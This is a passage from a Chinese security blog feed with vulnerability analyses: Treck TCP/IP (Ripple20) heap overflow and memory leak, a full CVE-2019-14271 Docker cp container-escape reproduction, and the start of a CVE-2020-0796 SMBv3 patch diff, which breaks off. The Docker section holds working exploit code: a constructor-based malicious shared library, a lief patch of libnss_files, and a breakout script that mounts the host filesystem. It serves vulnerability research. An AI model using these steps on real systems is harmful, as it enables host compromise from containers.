href="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" title="img" class="gallery-item"><img src="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" alt="img"></a></p><h4 id="利用UDP实现堆溢出"><a href="#利用UDP实现堆溢出" class="headerlink" title="利用UDP实现堆溢出"></a>利用UDP实现堆溢出</h4><p>既然我们已经达到了不一致的状态，我们就面临着另一个问题–我们如何利用这种不一致来获得内存损坏原语？<br>原来，至少有一条代码路径将碎片数据复制到单个连续缓冲区中。这是处理UDP数据报的代码的一部分。该流的内部逻辑由正在分配的新分组(使用tfGetSharedBuffer)组成，其大小基于pktuChainDataLength字段，随后是分组的不同片段的副本逐个进入新分配的分组。<br>负责执行复制的函数是tfCopyPacket，它按顺序接受源包和目的包。以下是片段复制代码的摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(dst-&gt;pktuLinkDataPtr + i,src-&gt;pktuLinkDataPtr,src-&gt;pktuLinkDataLength); i = i + src-&gt;pktuLinkDataLength;</span><br><span class="line">src = (tsPacket *)src-&gt;pktuLinkNextPtr;</span><br><span class="line">&#125; <span class="keyword">while</span> (src != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>如您所见，函数tfCopyPacket没有考虑它写入的缓冲区的长度。它只是从src包(我们的分段包)中提取每个链接，并将其数据复制到目标包中。目标数据包是根据pktuChainDataLength分配的，因此如果之前触发了该漏洞，则在我们的无效之后，分配的缓冲区可能小于数据包中所有单个链接的总和-因此，会发生堆溢出。</p><p>还有一件事需要描述，那就是我们如何触发这一流程。</p><p>如果应用程序正在侦听任何UDP端口，则发往该端口的UDP数据包将被传递给套接字处理函数tfSocketIncomingPacket。其任务是将数据包附加到套接字接收队列(稍后由应用层轮询)。</p><p>在我们的研究中，我们发现当UDP数据包的套接字接收队列非空并且有新的数据包到达时，上述包含堆溢出的流是可以实现的。请看tfSocketIncomingPacket的以下摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ocal_10 = pkt;</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">if</span> (sockEntry-&gt;socReceiveQueueNextPtr == <span class="literal">NULL</span>) &#123; sockEntry-&gt;socReceiveQueueNextPtr = pkt; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">queueLastPtr = sockEntry-&gt;socReceiveQueueLastPtr;</span><br><span class="line"><span class="keyword">if</span> ((queueLastPtr-&gt;pktSharedDataPtr-&gt;dataFlags &amp; <span class="number">0x40</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Shared data doesn&#x27;t point to user device memory */</span></span><br><span class="line">sizeOfPacketBuffer = (uint)(pkt-&gt;pktSharedDataPtr-&gt;dataBufLastPtr +</span><br><span class="line">‹→ -(<span class="keyword">int</span>)pkt-&gt;pktSharedDataPtr-&gt;dataBufFirstPtr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (protoNum == <span class="number">6</span>) &#123;</span><br><span class="line"><span class="comment">/* Related to TCP; redacted for brevity */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (sizeOfPacketBuffer != <span class="number">0</span>) &#123;</span><br><span class="line">uVar2 = (uint)sockEntry-&gt;socRecvCopyFraction * pkt-&gt;pktuChainDataLength; <span class="keyword">if</span> (uVar2 &lt;= sizeOfPacketBuffer) &#123;</span><br><span class="line">dst = tfGetSharedBuffer(<span class="number">0x54</span>,pkt-&gt;pktuChainDataLength,<span class="number">0</span>); <span class="keyword">if</span> (dst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">tfCopyPacket(pkt,dst); needToDrop = <span class="literal">true</span>; local_10 = dst;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">queueLastPtr-&gt;pktChainNextPtr = local_10; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到，为了到达tfGetSharedBuffer，我们需要绕过涉及到ocRecvCopyFraction的检查。我们不知道它的确切用途，但通过调试和实验，我们发现它的值是4(在我们的情况下)。</p><p>在我们反复出现的示例中，我们的第一个数据包链路的缓冲区大小很小，因此SizzeOfPacketBuffer。<br>相对较小(大约10s字节)。<br>但是当我们到达该流时，pkt-&gt;pktuChainDataLength等于4(修剪后为32，然后在处理IP层时递减20(IP报头的大小)，然后再次递减8(UDP报头的大小))。因此，4*4=16小于sizeOfPacketBuffer，我们通过此检查。<br>我们需要确保的最后一件事是UDP数据包的接收队列是非空的(否则无法到达此流)。在理论上，有几种方法可以做到这一点。在我们的攻击中，我们发现将多个UDP数据包足够快地发送到同一端口就可以做到这一点。然而，要让这一部分可靠地工作是很棘手的。该漏洞是用Python编写的，使用的Scapy对于我们的目的来说太慢了。为了克服这个障碍，我们使用了Scapy的L3Socket对象，并实例化了一堆线程，这些线程只会用良性的UDP数据包淹没设备，因此套接字接收队列将是非空的。用C或GO编写代码可能也可以。根据要利用的设备和侦听服务器，可以对此部分进行其他改进。<br>另一个障碍是，在我们到达发生溢出的tfSocketIncomingPacket之前，易受攻击的数据包通过tfUdpIncomingPacket。此函数包含一些与UDP相关的健全性检查，因此我们还需要通过这些检查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">udpLen &#x3D; udpHdr-&gt;udpLength &gt;&gt; 8 | udpHdr-&gt;udpLength &lt;&lt; 8;</span><br><span class="line">if ((udpLen &lt; 8) || (*(ushort  *)&amp;pkt-&gt;pktuChainDataLength  &lt;  udpLen))  goto  dropPacket; if (udpLen &lt; *(ushort *)&amp;pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">tfPacketTailTrim(pkt,(uint)udpLen,0);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* ... *&#x2F;</span><br><span class="line">if ((udpHdr-&gt;udpChecksum !&#x3D; 0) &amp;&amp; (tvUdpIncomingChecksumOn !&#x3D; 0)) &#123;</span><br><span class="line">&#x2F;* Compute checksum... *&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我们所看到的，通过确保UDP长度字段等于pktuChainDataLength字段减去内部IP报头的大小，我们可以避免这种类型的修剪(不要与易受攻击的流混淆)。<br>总而言之：如果我们的设备上有UDP端口在监听，我们可以快速发送数据包，这样套接字接收队列就不会为空。同时，我们将发送会触发该漏洞的零碎UDP数据包，并勾选几个复选框。我们预期的结果是使用tfGetSharedBuffer在堆上分配一个小缓冲区，然后tfCopyPacket会使其溢出。</p><h2 id="CVE-2020-11898"><a href="#CVE-2020-11898" class="headerlink" title="CVE-2020-11898"></a>CVE-2020-11898</h2><p>前面提到了，Treck TCP/IP不能正确处理IP-in-IP隧道上传入的IPv4片段。这还可能允许未经验证的攻击者从 heap 中泄漏内存。</p><p>如果 tfIcmpErrPacket 将越界数据复制到错误数据包中，则可作为信息泄漏漏洞来被利用。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" title="image-20200630213501855" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" alt="image-20200630213501855"></a></p><p>参考如上实例：</p><p>当网络堆栈接收到这两个片段时，它会使用tfIpReAssemblePacket重新组装它们。此函数使用tsUserPacket结构中的字段pktuLinkNextPtr链接两个片段。如果启用了隧道，则IP层接下来将在函数tfIpIncomingPacket中处理内部IP数据包。</p><p>内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。此外，由于在标准IP报头(20字节)之后有4个空字节，并且空字节表示选项列表的末尾(见<a href="https://tools.ietf.org/html/rfc791)%EF%BC%8C%E5%9B%A0%E6%AD%A4IP%E9%80%89%E9%A1%B9%E8%A7%A3%E6%9E%90%E9%80%9A%E8%BF%87%E3%80%82">https://tools.ietf.org/html/rfc791)，因此IP选项解析通过。</a></p><p>如果内部IP数据包的IP报头中的总长度字段严格小于链数据长度，则网络堆栈将尝试修剪数据包。如前文中所述，修剪是通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值，即总长度字段(在我们的示例中为100)来实现的。</p><p>由于内部IP数据包包含无效的IPv4协议号(协议0)，因此网络堆栈将通过发送类型为3(目的地不可达)代码为2(协议不可达)的ICMP错误消息来拒绝该数据包。</p><p>负责创建错误数据包的函数是tfIcmpErrPacket。它会分配一个新数据包，初始化一些ICMP字段，并最终从违规数据包(内部IP数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length   =   (packetPtr-&gt;pktUserStruct).pktuLinkDataLength; <span class="keyword">if</span> (headerLengthInBytes + <span class="number">8</span> &lt;= length) &#123;</span><br><span class="line">length = headerLengthInBytes + <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(icmpErrHdrPtr + <span class="number">8</span>, pktIpHdrPtr, length);</span><br></pre></td></tr></table></figure><p>正如我们所看到的，tfIcmpErrPacket通过取IP报头长度(以字节为单位)加8(在我们的示例中，60+8=68)和pktuLinkDataLength字段(在本例中修剪为100)之间的最小值来计算要复制的字节数。由于违规数据包的第一个片段的实际链接数据长度为24(不是100)，tfIcmpErrPacket将复制68−24=44字节从堆中泄漏的数据。</p><p>此漏洞可用于在启用漏洞缓解(如ASLR)时，以及在没有调试器的情况下，利用CVE2020-11896和其他RCE漏洞进行攻击。</p><p>2020-7-2 更新</p><p>试了下文章写的 poc 发现并没有任何返回，但是机器直接打崩了。等个可以调试的设备。</p><h2 id="关于-treck-协议栈扫描"><a href="#关于-treck-协议栈扫描" class="headerlink" title="关于 treck 协议栈扫描"></a>关于 treck 协议栈扫描</h2><p>看到 启明星辰 ADLAB 的公众号提到了 Treck协议栈自定义了类型为165(0xa5)的ICMP包，并一旦收到165的ICMP包会回复类型为166的ICMP包响应。<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" alt="img"></a></p><p>由于手头没有相应的设备，以及查下公司的打印机相关设备，似乎都没有在官方公告的影响范围内，所以用这个方法跑了下，就到目前写这篇文章为止了，大概跑了1000多个 IP ，没有任何返回，目前猜测，公网 scan 的 话可能会被网关给 drop 掉。</p><p>2020-7-2 更新：</p><p>昨天发现上海公司有一台设备，测试的时候发现 scapy 写的扫描是有问题的，scapy 本身似乎对包进行了判断，导致拿不到回包，所以 github 上公开的扫描应该是不行，另外一点 ttl 如果太小似乎也会被drop掉(在多层路由的情况下)</p><p>这里贴一下我用 socket 写的脚本</p><p>设置 ICMP_ECHO_REQUEST 为0xa5 ，然后再收包判断 type</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png"></a></p><p>例：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" title="image-20200702113751286" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" alt="image-20200702113751286"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf">https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw">https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-11896" scheme="https://bestwing.me/tags/CVE-2020-11896/"/>
    
    <category term="CVE-2020-11898" scheme="https://bestwing.me/tags/CVE-2020-11898/"/>
    
    <category term="Treck" scheme="https://bestwing.me/tags/Treck/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14271 docker escape</title>
    <link href="https://bestwing.me/CVE-2019-14271-docker-escape.html"/>
    <id>https://bestwing.me/CVE-2019-14271-docker-escape.html</id>
    <published>2020-06-02T16:00:00.000Z</published>
    <updated>2020-06-22T18:00:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<blockquote><p><a href="https://github.com/moby/moby/pull/39612">https://github.com/moby/moby/pull/39612</a></p></blockquote><h2 id="github-issue："><a href="#github-issue：" class="headerlink" title="github issue："></a>github issue：</h2><p>Initialize nss libraries in Glibc so that the dynamic libraries are loaded in the host environment not in the chroot from untrusted files.</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14271">CVE-2019-14271</a> may allow unprivileged access to host system while copying files from a malicious container image with <code>docker cp</code> command.</p><p><strong>Affected versions</strong>: v19.03.0. Older Docker versions are not affected by this issue.</p><p>This fix is included in the already released <a href="https://github.com/docker/docker-ce/releases/v19.03.1">Docker v19.03.1</a>. Users of Docker v19.03.0 are advised to upgrade.</p><p>The patch was previously reviewed internally by maintainers under GitHub security advisory.If you find security issues in Moby, please follow responsible disclosure guidelines by sending an email to <a href="mailto:security@docker.com">security@docker.com</a>.</p><p>yum list docker-ce –showduplicates|sort –r</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天和 @explorer 一起看了下这个洞，以及好久没更博客了，随手写个文章记录下：</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞成因是由于，<code>docker cp</code>  进行拷贝的时候，将 <code>docker-tar</code> 此进程先 chroot 到容器内，然而此时使用的 so 文件也是容器内的，而 <code>docker-tar</code> 进程本身没有容器化，意味着仍然拥有高权限，所以此时如果容器内的 so 被恶意篡改，那么可能造成 docker 容器逃逸 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp cve-2019-14271:/lib ./lib &amp; <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ps -auxf |grep -v grep|grep docker-tar|tr -s <span class="string">&#x27; &#x27;</span>|cut -d <span class="string">&#x27; &#x27;</span> -f 2|xargs -I&#123;&#125; ls -al /proc/&#123;&#125;/root ; <span class="keyword">done</span> |  uniq</span><br></pre></td></tr></table></figure><p>通过上述命令可以清晰的看到 chroot 过程</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" title="chroot" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" alt="chroot"></a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>安装 apt 依赖包，用于通过HTTPS来获取仓库: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加 Docker 的官方 GPG 密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>使用以下指令设置稳定版仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">  stable&quot;</span></span><br></pre></td></tr></table></figure><p>列出 <code>docker-ce</code> 的所有版本 </p><p><code>apt-cache madison docker-ce</code></p><p>安装有漏洞的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce=5:19.03.0~3-0~ubuntu-bionic docker-ce-cli=5:19.03.0~3-0~ubuntu-bionic containerd.io</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>由于是 <code>docker-cp</code> 这个进程出现的问题，其本身用到了 <code>libnsss_*.so*</code> 的一些库，所以我们选择对其进程 so 劫持</p><p>劫持代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __attribute__((constructor)) back() </span><br><span class="line">&#123;     </span><br><span class="line"> FILE *proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>,<span class="string">&quot;r&quot;</span>);   </span><br><span class="line"> <span class="keyword">if</span> (proc_file !=<span class="literal">NULL</span>)    &#123;   </span><br><span class="line">                fclose(proc_file);       </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;        </span><br><span class="line">system(<span class="string">&quot;/breakout&quot;</span>);        </span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于程序在执行的时候，有chroot 过程，避免其他进程也使用了这些库，所以先判断 <code>/proc/self/exe</code> 是否可读，如果可读则不是我们的目标进程</p><p>另外这里用到了 <code>constructor</code> 魔术方法，之前在 geekpwn maxhub 利用的时候也提到了，这里不再赘述。</p><p>patch <code>libss_files-2.27.so</code> 代码, 这里使用 lief 进行 patch</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line">&lt;lief.ELF.Binary object at <span class="number">0x7f749704f030</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a= lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.add_library(<span class="string">&quot;/tmp/a.out&quot;</span>)</span><br><span class="line">&lt;lief.ELF.DynamicEntryLibrary object at <span class="number">0x7f74963d9ae8</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.write(<span class="string">&quot;libnss_files-2.27.so.patch&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后将上面的 c 代码进行编译</p><p><code>gcc -shared -fPIC backdoor.c</code></p><p>首先，创建一个容器作为攻击目标</p><p><code>docker run --rm -it --name cve-2019-14271 ubuntu:18.04 /bin/bash</code></p><p>然后将修改后的 so 和利用的脚本放入容器内：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp a.out cve-2019-14271:/tmp </span><br><span class="line">docker cp breakout cve-2019-14271:/ </span><br><span class="line">docker cp libnss_files.so.2_patch cve-2019-14271:/lib/x86_64-linux-gnu/libnss_files-2.27.so</span><br></pre></td></tr></table></figure><p>此时 breakout的内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /host_fs</span><br><span class="line">mount -t proc none /proc</span><br><span class="line"><span class="built_in">cd</span> /proc/1/root</span><br><span class="line">mount --<span class="built_in">bind</span> . /host_fs</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hack by chaitin&quot;</span> &gt; /proc/1/root/tmp/hack</span><br></pre></td></tr></table></figure><p>则意味着，攻击成功有两个标志：</p><p>1、容器内的 /host_fs 映射了容器外的内容</p><p>2、容器外的 tmp 的 hack 写入 <code>hack by chaitin</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" title="mount-root-fs-to" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" alt="mount-root-fs-to"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" title="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" alt="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png"></a></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2](https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2)">patch diif</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" title="patch-diff" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" alt="patch-diff"></a></p><p>补丁新增了 <code>init</code> 函数，强制进程进入到容器内的时候，先加载容器外的 so 文件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CVE-2019-14271-analyze</summary>
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2019-14271" scheme="https://bestwing.me/tags/CVE-2019-14271/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796 SMBv3 漏洞分析</title>
    <link href="https://bestwing.me/CVE-2020-0796-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-0796-analysis.html</id>
    <published>2020-03-12T16:00:00.000Z</published>
    <updated>2020-12-05T18:52:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="CVE-2020-0796-SMBv3-漏洞分析"><a href="#CVE-2020-0796-SMBv3-漏洞分析" class="headerlink" title="CVE-2020-0796 SMBv3 漏洞分析"></a>CVE-2020-0796 SMBv3 漏洞分析</h1><p>3月13日 凌晨左右 ，微软放了这个漏洞的补丁…所以稍微分析一下他的补丁</p><h2 id="Bindiff"><a href="#Bindiff" class="headerlink" title="Bindiff"></a>Bindiff</h2><p>通过 bindiff 比较发现一个函数，且名字也蛮可疑的..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" style="zoom: 50%;" /></a><p>这个函数名叫 <code>Srv2DecompressData</code> 实际上和漏洞描述其实也差不多..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" style="zoom: 50%;" /></a><p>似乎是加了检查..我们 打开IDA来比对一下 两者的差别..</p><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png"></a></p><p>左边是有漏洞的版本，右边是 Patch 后的版本 .. 比对了一下发现似乎增加了一个检查..尤其是增加的一个叫</p><p><code>RtlULongAdd</code> 的函数..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlULongAdd(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span><br></pre></td></tr></table></figure><p>该函数的参数是 两个似乎 recve 的数据 以及一个变量..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">RtlULongAdd</span><span class="params">(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ULONG v3; <span class="comment">// eax</span></span><br><span class="line">  ULONG v4; <span class="comment">// edx</span></span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = ulAugend + ulAddend;</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= ulAugend )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  result = v3 &lt; ulAugend ? <span class="number">0xC0000095</span> : <span class="number">0</span>;</span><br><span class="line">  *pulResult = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了一下这个  判断了  ulAugend + ulAddend 相加后的和是否小于其中一个 加数..如果是则将其中一个赋值给返回值..从这里大概能初步判断是个什么漏洞了..基本能猜测是个  整型溢出..</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" 